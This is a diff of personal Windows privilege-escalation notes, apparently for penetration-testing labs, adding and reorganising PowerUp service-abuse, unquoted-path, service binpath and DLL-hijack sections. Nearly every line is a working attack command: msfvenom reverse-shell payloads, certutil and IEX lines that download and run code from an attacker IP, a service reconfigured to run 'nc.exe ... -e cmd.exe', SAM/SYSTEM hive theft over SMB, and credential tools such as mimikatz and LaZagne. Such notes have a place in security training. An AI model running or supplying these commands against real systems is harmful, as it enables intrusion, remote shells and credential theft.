@@ -270,8 +270,37 @@ dir c:\users\username\appdata\roaming\microsoft\credentials
 type "%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings" 
 type "%LOCALAPPDATA%\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"  
 Check for credentials in .rdg files 
+
+
+================================== 
+Powerup - Find Exploitable Service
  
- 
+ALL common Windows privesc (bypassuac, service-abuse, gpp-passwords, tokens) 
+Dev branch has extra checks – Can find 'SeImpersonatePrivilege' tokens too 
+Look for services running as 'System'. 
+
+mkdir c:\temp
+python3 -m http.server 80
+wget http://192.168.162.46/powerup.ps1 -o powerup.ps1
+certutil -urlcache -split -f http://192.168.162.46:80/PowerUp.ps1 
+powershell -exec bypass -Command "& Import-Module .\\PowerUp.ps1;Invoke-AllChecks"
+powershell -nop -noexit -exec bypass -c '.\PowerUp.ps1'
+powershell.exe -nop -ExecutionPolicy bypass  
+IEX(New-Object Net.WebClient).downloadString('http://192.168.162.46:80/PowerUp.ps1') 
+Import-Module .\PowerUp.ps1 
+Invoke-AllChecks 
+
+Found Exploitable Service
+msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=80 -f exe -o mike80.exe 
+python3 -m http.server 80
+certutil -urlcache -split -f http://192.168.162.46:80/mike80.exe 
+cd C:\xampp\fz\ 
+move fz.exe fz.old 
+move C:\xampp\upload\mike80.exe fz.exe 
+shutdown -r
+nc -nvlp 80
+
+
 ================================== 
 Unquoted Service Path PrivEsc
 
@@ -283,29 +312,32 @@ echo ok > "C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\test.t
 echo ok > "C:\Program Files (x86)\Foxit Software\Foxit Reader\test.txt" 
 echo ok > "C:\Program Files (x86)\Foxit Software\test.txt" 
 echo ok > "C:\Program Files (x86)\test.txt" 
-msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 LHOST=192.168.162.46 LPORT=444 > rev.exe 
+msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 LHOST=192.168.162.46 LPORT=443 > rev.exe 
+python3 -m http.server 80
 powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.162.46/rev.exe', 'C:\Program Files (x86)\Foxit Software\Foxit.exe')" 
 shutdown -r -t 10 && exit 
-nc -nvlp 444
+nc -nvlp 443
 
-=================================== 
-Powerup to find Exploitable Service
 
-cd ~/lab/
-cp ~/tools/privesc_windows/PowerUp.ps1 . 
-webup 80 
-certutil -urlcache -split -f http://192.168.162.46:80/PowerUp.ps1 
-powershell -exec bypass -Command "& Import-Module .\\PowerUp.ps1;Invoke-AllChecks"
-powershell -nop -noexit -exec bypass -c '.\PowerUp.ps1'
-msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=80 -f exe -o mike80.exe 
-webup 80 
-certutil -urlcache -split -f http://192.168.162.46:80/mike80.exe 
-cd C:\xampp\fz\ 
-move fz.exe fz.old 
-move C:\xampp\upload\mike80.exe fz.exe 
-shutdown -r
-nc -nvlp 80
+==================================
+BINARY_PATH_NAME
 
+mkdir c:\temp
+python3 -m http.server 80
+wget http://192.168.162.46/powerup.ps1 -o powerup.ps1
+wget http://192.168.162.46/nc.exe -o nc.exe
+Import-Module .\powerup.ps1
+Invoke-AllChecks
+
+Vulnerable Service: UsoSvc - BINARY_PATH_NAME is Vulnerable
+C:\Windows\system32\svchost.exe -k netsvcs -p
+
+sc.exe qc UsoSvc
+sc.exe config usosvc binpath="c:\windows\temp\nc.exe 192.168.162.46 443 -e cmd.exe"
+sc.exe config usosvc obj=LocalSystem
+net stop usosvc
+net start usosvc
+nc -nvlp 443
 
 ================================== 
 DLL Hijack
@@ -318,6 +350,7 @@ echo %path%              ..Want Exploitable-Path
 cacls "C:\Python27"      ..Want Authenticated Users (M) 
 accesssschk.exe -dqv "C:\Python27" 
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.162.46 LPORT=445 -f dll > shell.dll  
+python3 -m http.server 80
 powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.162.46/shell.dll', 'C:\Python27\wlbsctrl.dll')" 
 copy shell.dll C:\Python27\wlbsctrl.dll 
 net stop IKEEXT
@@ -332,7 +365,8 @@ TOOLS
 cd ~\tools\privesc_windows
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password helps  
 net use \\192.168.49.124\share /USER:mike helps  
-cd C:\Windows\Temp\
+mkdir C:\temp
+cd C:\temp\
 cd C:\Users\Bob\Downloads\ 
 copy winPEASx64.exe \\192.168.49.124\share\
 copy chisel.exe \\192.168.49.124\share\
@@ -361,12 +395,10 @@ LaZagne - Cred Search
 https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
 laZagne.exe all
 laZagne.exe all -oA -output C:\Users\test\Desktop
-
  
 ================================== 
 Quick-Paste-Report
 https://pentest.mxhx.org/07-win-privesc/win-enum#quick-paste-report 
- 
  
 ================================== 
 winPEAS
@@ -383,40 +415,14 @@ icalcs C:\bd\bd.exe
 copy /Y C:\xammp\htdocs\shell.exe C:\bd\bd.exe 
 shutdown -r 
 nc -nvlp 445 
- 
- 
- 
-================================== 
-PowerUp 
- 
-ALL common Windows privesc (bypassuac, service-abuse, gpp-passwords, tokens) 
-Dev branch has extra checks – Can find 'SeImpersonatePrivilege' tokens too 
-Look for services running as 'System'. 
 
-webup 80
-certutil -urlcache -split -f http://192.168.162.46:80/PowerUp.ps1 
-powershell.exe -exec bypass -Command "& Import-Module .\\PowerUp.ps1;Invoke-AllChecks"
-
-powershell.exe -nop -ExecutionPolicy bypass  
-IEX(New-Object Net.WebClient).downloadString('http://192.168.162.46:80/PowerUp.ps1') 
-Import-Module .\PowerUp.ps1 
-Invoke-AllChecks 
-
-Found Exploitable Service
-msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=80 -f exe -o mike80.exe 
-python3 -m http.server 80
-certutil -urlcache -split -f http://192.168.162.46:80/mike80.exe 
-cd C:\xampp\fz\ 
-move fz.exe fz.old 
-move C:\xampp\upload\mike80.exe fz.exe 
-shutdown -r
-nc -nvlp 80
 
 
 ================================== 
 WES – Kernel Checks 
  
-cd C:\Windows\Temp
+mkdir c:\temp
+cd c:\temp
 systeminfo > systeminfo.txt 
  
 Kali:
@@ -452,12 +458,13 @@ Consider: mxsam
 ================================== 
 SAM
 
-cd C:\Windows\Temp\  
+mkdir c:\temp
+cd c:\temp\  
 copy samx \\192.168.119.154\share\  
 copy systemx \\192.168.119.154\share\  
 copy securityx \\192.168.119.154\share\  
-smbup -smb2support -username mike -password paxx  
-net use \\192.168.49.124\share /USER:mike paxx  
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password helps  
+net use \\192.168.49.124\share /USER:mike helps
 copy *x \\192.168.49.124\share\  
 secretsdump -sam samx -system systemx LOCAL  
  
@@ -511,8 +518,13 @@ for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.200.%i > nul && echo 192.168
 
 
 ================================== 
-Refresh Tools (this needs work)
- 
+Refresh Tools
+
+mkdir ~/tools/old
+mv ~/tools/privesc_windows ~/tools/old/
+mkdir ~/tools/privesc_windows
+cd ~/tools/privesc_windows
+
 git clone https://github.com/carlospolop/PEASS-ng/releases/ 
 linpeas.sh 
 winPEAS.bat 
@@ -525,11 +537,28 @@ PowerUp.ps1
 git clone https://github.com/bitsadmin/wesng --depth 1 
 wes.py
 
+wget https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
+lazagne.exe
+
+https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+Invoke-Kerberoast.ps1  
+
+chisel.exe 
+https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_386.gz
+https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz
+
+https://github.com/BloodHoundAD/SharpHound/releases/download/v1.0.4/SharpHound-v1.0.4.zip
+SharpHound.exe
+
+https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip
+Mimikatz_64.exe
+
 
 ================================== 
 Remotes 
 
-xfreerdp /v:192.168.200.5 /d:mike.com /u:mike /p:paxx -sec-nla +clipboard /geometry /w:1680 /h:900 
+xfreerdp /v:192.168.200.5 /d:mike.com /u:mike /p:pass -sec-nla +clipboard /geometry /w:1680 /h:900 
 psexec mydom/administrator:"paxx"@192.168.200.5
 psexec admin@192.168.200.5 -hashes aad3b435b51404:ee0c207898a5bc   
 psexec mydom/bob:Paxxword@192.168.200.5
